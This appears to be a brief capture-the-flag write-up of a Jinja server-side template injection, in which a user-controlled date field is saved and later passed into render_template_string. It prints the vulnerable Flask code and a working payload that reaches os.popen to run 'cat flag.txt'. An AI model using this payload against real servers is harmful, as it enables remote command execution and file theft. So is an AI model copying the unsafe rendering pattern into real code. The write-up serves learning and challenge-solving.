This week was exploiting jinja templating.

The server reads the caption we send and the date

	caption = request.form["text"]

	date = request.form["date"]


The date is later saved

        with open(f"img/{filename}.txt", 'w') as f:
            f.write(date)

And reused as the alt text

with open(txt_path, "r") as f:
            alt_text = f.read().strip()


Which means we have complete controll to the input to

return render_template_string(f"""
    <img src="{image_url}" alt="{alt_text}">
""")



Using the dev console to modify the date sent we can execute

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}

Giving us the flag.
